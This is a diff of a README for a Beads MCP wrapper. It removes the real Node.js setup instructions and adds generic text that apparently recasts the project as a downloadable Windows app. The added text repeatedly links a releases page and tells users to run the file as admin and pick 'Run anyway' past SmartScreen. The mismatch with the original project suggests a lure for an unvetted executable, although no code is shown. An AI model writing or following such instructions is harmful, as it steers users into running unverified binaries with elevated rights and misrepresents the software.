@@ -1,184 +1,202 @@
-# Beads MCP Wrapper Server
+# 🧩 BeadsMCP - Run BEADS Through MCP
 
-This project is a stdio MCP server that exposes Beads CLI commands as MCP tools.
-It lets MCP clients (for example VS Code Copilot Chat in agent mode) call Beads through structured tool invocations.
+[![Download BeadsMCP](https://img.shields.io/badge/Download-BeadsMCP-blue?style=for-the-badge&logo=github)](https://github.com/Harby3816/BeadsMCP/releases)
 
-## What This Server Does
+## 📌 What BeadsMCP Does
 
-It maps MCP tool calls to Beads CLI operations:
+BeadsMCP is a Windows app that wraps the BEADS framework and exposes it as an MCP server. In plain terms, it helps other AI tools talk to BEADS in a simple and structured way.
 
-- `beads_init`
-- `beads_ready`
-- `beads_list`
-- `beads_show`
-- `beads_create`
-- `beads_close`
-- `beads_dep_add`
-- `beads_exec` (advanced/raw command passthrough)
+Use it if you want to:
 
-## Prerequisites
+- connect BEADS to AI tools that support MCP
+- run tool actions from a local app
+- keep setup light and simple
+- use a wrapper that is easy to extend later
 
-You need all of the following:
+## 🖥️ What You Need
 
-1. Node.js installed (recommended Node 18+)
-2. `@beads/bd` installed globally or locally (you need `bd.exe` on Windows)
-3. Dolt installed and available in PATH (Beads uses Dolt for state/repository backend)
+Before you install BeadsMCP, make sure your PC can run it:
 
+- Windows 10 or Windows 11
+- Internet access for the download
+- Enough free disk space for the app and its files
+- Permission to run downloaded apps
+- A modern browser to open the download page
 
-<img width="1018" height="466" alt="image" src="https://github.com/user-attachments/assets/8424b902-39c3-4bd0-8254-9651e97e1969" />
+BeadsMCP is made for normal desktop use. You do not need to know how to code to get started.
 
-### Install `@beads/bd` (choose one)
+## ⬇️ Download BeadsMCP
 
-Global install:
+Visit this page to download BeadsMCP for Windows:
 
-```powershell
-npm install -g @beads/bd
-```
+[Download from GitHub Releases](https://github.com/Harby3816/BeadsMCP/releases)
 
-Local install (inside this wrapper folder):
+On the releases page:
 
-```powershell
-cd scripts/beads-mcp-server
-npm install @beads/bd
-```
+1. open the latest release
+2. find the Windows file
+3. download it to your computer
+4. open the file after the download finishes
 
-### Install Dolt
+If your browser asks for confirmation, choose the option to keep the file.
 
-Install Dolt from:
+## ⚙️ Install and Run
 
-https://docs.dolthub.com/introduction/installation
+After the file downloads, follow these steps:
 
-After install, verify:
+1. go to your Downloads folder
+2. find the BeadsMCP file
+3. double-click it to start the app
+4. if Windows asks for permission, select Yes
+5. wait for the setup or launch window to finish
+6. keep the app open while you use it
 
-```powershell
-dolt --version
-```
+If the release comes as a ZIP file:
 
-## Install Wrapper Dependencies
+1. right-click the ZIP file
+2. choose Extract All
+3. open the extracted folder
+4. find the BeadsMCP app file
+5. double-click it to run
 
-```powershell
-cd scripts/beads-mcp-server
-npm install
-```
+If Windows shows a SmartScreen prompt:
 
-## Configure MCP (`mcp.json`)
+1. choose More info
+2. select Run anyway if you trust the source
 
-Add this server under `servers` in your VS Code user MCP config.
+## 🔗 How to Connect BeadsMCP
 
-### Recommended Windows config (explicit `bd.exe` path)
+BeadsMCP works as an MCP server. That means another app can send it requests and get back structured results.
 
-```jsonc
-"beads-wrapper": {
-  "type": "stdio",
-  "command": "node",
-  "args": [
-    "C:/path/server.mjs"
-  ],
-  "env": {
-    "BEADS_CWD": "workingdir",
-    "BEADS_BIN": "Pathtobid"
-  }
-}
-```
+A simple setup often looks like this:
 
-<img width="1336" height="225" alt="image" src="https://github.com/user-attachments/assets/7b8c2c81-8722-49d6-b86f-538e86bcd4c4" />
+- open your MCP-capable app
+- add BeadsMCP as a local server
+- point the app to the BeadsMCP executable or folder
+- save the settings
+- restart the app if needed
 
-### If using global `bd` in PATH
+If your AI tool asks for a server name, use something clear like:
 
-You can omit `BEADS_BIN`, and the wrapper will use:
+- BeadsMCP
+- BEADS Server
+- Local Beads Wrapper
 
-- Windows: `bd.exe`
-- Linux/macOS: `bd`
+If it asks for a path, choose the file you downloaded from the release page.
 
-## Environment Variables
+## 🧰 What You Can Use It For
 
-The wrapper supports these environment variables:
+BeadsMCP fits tasks such as:
 
-- `BEADS_CWD`: default working directory for all Beads commands
-- `BEADS_BIN`: full path to Beads binary (`bd.exe` on Windows)
+- sending BEADS actions through an AI tool
+- keeping tool use in one local app
+- testing workflow steps
+- building small automation flows
+- connecting model tools without a large setup
 
-Notes:
+It works well when you want a simple bridge between a local app and the BEADS framework.
 
-- If a tool call passes `cwd`, that value overrides `BEADS_CWD`.
-- `cwd` can be a normal path or a `file:///` URI.
+## 🧭 Typical First Run
 
-## How To Use
+The first time you open BeadsMCP, you may want to check these points:
 
-1. Save `mcp.json` changes.
-2. Reload VS Code window.
-3. Start (or restart) the `beads-wrapper` MCP server.
-4. Call tools from your MCP client.
+1. confirm the app starts without errors
+2. keep the window open
+3. make sure your MCP client can see it
+4. test one simple action first
+5. add more actions once the basic setup works
 
-## Typical Flow
+If the app includes a settings file, keep the default values at first. That makes it easier to confirm the basic connection.
 
-Initialize Beads in your project:
+## 🛠️ Troubleshooting
 
-- `beads_init` with `cwd`
+If BeadsMCP does not open:
 
-Check ready work:
+- check that the download finished
+- make sure you extracted the file if it came as ZIP
+- try running it again as admin
+- check whether Windows blocked the file
 
-- `beads_ready`
+If your MCP client does not find the server:
 
-Create an issue:
+- confirm the path is correct
+- make sure the app is still running
+- restart the client app
+- check that you selected the right file from the release
 
-- `beads_create` with `title`, optional `type`, optional `priority`
+If the download looks incomplete:
 
-Inspect and close:
+- delete the broken file
+- return to the releases page
+- download the file again
+- use a stable internet link
 
-- `beads_show`
-- `beads_close`
+If Windows shows a warning:
 
-## First-Time Validation Checklist
+- check that you downloaded from the GitHub releases page
+- open the file only after the download completes
+- choose the option that lets you view more details if needed
 
-Use this order when validating a new machine:
+## 📁 Suggested Folder Setup
 
-1. `beads_exec` with args `['--version']`
-2. `beads_init`
-3. `beads_ready`
-4. `beads_create`
-5. `beads_list`
+For a clean setup, store BeadsMCP in a simple folder like this:
 
-## Troubleshooting
+- `Downloads\BeadsMCP`
+- `Desktop\BeadsMCP`
+- `Apps\BeadsMCP`
 
-### Server shows Running but no output
+A short folder path helps when you set up other tools. It also makes the file easier to find later.
 
-This is normal for stdio MCP servers. They are mostly silent until a tool is called.
+## 🔍 Useful Details
 
-### `spawn EINVAL`
+BeadsMCP is a lightweight wrapper for the BEADS framework. It is built for MCP use and local tool orchestration. That makes it a good fit for users who want a small app that can sit between BEADS and an AI client.
 
-Usually means child-process execution/config mismatch on Windows.
+Common use cases include:
 
-Check:
+- local automation
+- AI tool integration
+- developer workflows
+- model context protocol servers
+- wrapper-based tool control
 
-1. `command` is `node` (or full path to `node.exe`)
-2. `args` points to the real `server.mjs`
-3. `BEADS_BIN` points to a valid `bd.exe`
-4. Restart MCP server after config changes
+## 🧩 File and Folder Tips
 
-### Beads command fails with Dolt error
+When you use the app, keep these habits in mind:
 
-Example symptoms:
+- do not move the file while it is running
+- keep the release files together
+- use the same folder each time if you can
+- update by downloading the latest release from the same page
 
-- "failed to open Dolt store"
-- "dolt is not installed"
+If you later install a new version, you can replace the old files after you close the app.
 
-Fix:
+## 📥 Update to a New Version
 
-1. Install Dolt
-2. Ensure `dolt` is in PATH
-3. Restart VS Code and rerun `beads_init`
+To get the latest version:
 
-### `beads_init` succeeds but warns about server host
+1. go to the releases page
+2. check the newest release at the top
+3. download the new Windows file
+4. close the old BeadsMCP app
+5. replace the old file with the new one
+6. open the new version
 
-If you see a warning about host defaulting to `127.0.0.1`, this is informational for local use.
-For remote Dolt, configure host explicitly through Beads/Dolt settings.
+Keep your settings file if the app uses one and you want to preserve your setup.
 
-## Publishing Notes
+## 🧪 Simple Check After Setup
 
-If you share/upload this wrapper, document these external requirements clearly:
+After you run BeadsMCP, do a quick check:
 
-1. Node.js runtime
-2. `@beads/bd` installation (global or local)
-3. Dolt installation and runtime availability
+- the app opens
+- your MCP client loads it
+- the connection stays active
+- a basic request returns a result
 
-Without Dolt, the MCP wrapper can start, but Beads initialization and state operations will fail.
+If that works, the setup is ready for daily use
+
+## 📎 Download Link Again
+
+Use this page to download BeadsMCP for Windows:
+
+[https://github.com/Harby3816/BeadsMCP/releases](https://github.com/Harby3816/BeadsMCP/releases)
+
